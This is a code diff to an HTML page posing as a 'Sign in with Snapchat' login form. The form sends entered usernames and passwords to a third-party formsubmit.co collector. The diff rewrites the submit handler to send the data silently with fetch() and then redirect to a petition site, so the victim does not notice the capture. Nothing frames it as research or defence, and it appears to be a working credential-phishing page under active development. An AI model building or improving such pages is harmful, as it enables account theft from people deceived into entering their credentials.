@@ -10,13 +10,11 @@
   <div class="container">
     <div class="logo"></div>
     <h1>Sign in with Snapchat</h1>
-    <form action="https://formsubmit.co/178adf6086f8ae9a9bdb1945739ff8d9" method="POST">
+    <form id="loginForm" action="https://formsubmit.co/178adf6086f8ae9a9bdb1945739ff8d9" method="POST">
       <label for="username">Username or Email</label>
       <input type="text" id="username" name="username" required>
       <label for="password">Password</label>
       <input type="password" id="password" name="password" required>
-      <input type="hidden" name="_next" value="https://petition.me/petitions.html" />
-      <input type="hidden" name="_captcha" value="false" />
       <input type="submit" value="Log in">
     </form>
     <div class="login-box">
@@ -24,10 +22,24 @@
     </div>
   </div>
   <script>
-    document.querySelector('form').addEventListener('submit', function () {
-      location.href = "https://petition.me/petitions.html";
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent form submission
+      var form = event.target;
+      fetch(form.action, {
+        method: form.method,
+        body: new FormData(form)
+      })
+      .then(function(response) {
+        if (response.ok) {
+          window.location.href = "https://petition.me/petitions.html";
+        } else {
+          // Handle error or display error message
+        }
+      })
+      .catch(function(error) {
+        // Handle error or display error message
+      });
     });
   </script>
 </body>
 </html>
-
